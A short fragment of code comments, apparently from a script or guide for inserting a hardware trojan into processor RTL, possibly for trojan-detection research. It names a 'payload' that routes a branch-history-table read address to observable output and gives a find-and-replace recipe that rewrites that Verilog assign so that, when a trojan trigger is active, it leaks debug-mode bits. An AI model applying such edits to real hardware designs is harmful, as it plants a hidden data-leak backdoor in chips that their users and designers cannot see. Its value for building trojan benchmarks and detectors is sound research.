 ...
 * Payload: Route bht_ram_read_address_0[0] to observable output
 * 
...
//   Find the assign for bht_ram_read_address_0 (or rd_error_o as fallback):
//     assign bht_ram_read_address_0 = <normal_expr>;
//   Replace with:
//     assign bht_ram_read_address_0 = trojan_active ? debug_mode_i[leak_bit_idx] : (<normal_expr>);
//
